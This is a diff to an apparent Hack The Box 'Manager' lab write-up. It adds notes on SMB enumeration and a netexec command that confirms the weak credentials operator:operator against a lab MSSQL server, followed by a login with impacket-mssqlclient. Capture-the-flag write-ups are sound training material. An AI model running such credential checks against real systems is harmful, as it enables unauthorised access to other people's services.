@@ -151,8 +151,20 @@ enumerating smb using the creds we got, we can see we have read access to shares
 
 ![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/8c5754b5-1b5f-4143-b5db-8dfd93e5c059)
 
-checking the `NETLOGON` share was empty, we got a dir in the `SYSVOL` share. proceded to download everything in it. 
+checking the `NETLOGON` share was empty, we got a dir in the `SYSVOL` share. proceded to download everything in it. checked everything in the smb, got nothing useful
 
 
 ## Enumerating mssql 
+
+```
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Manager]
+└─$ sudo nxc mssql 10.129.22.154 -u operator -p operator 
+MSSQL       10.129.22.154   1433   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:manager.htb)
+MSSQL       10.129.22.154   1433   DC01             [+] manager.htb\operator:operator   
+```
+using netexec to check for access on mssql server, we can see we have access to the mssql service. let's login mssql 
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/149d185f-b6c7-4978-ab5c-f2509fb613e1)
+
+using impacket script `impacket-mssqlclient` to login as user operator to the mssql server. 
 
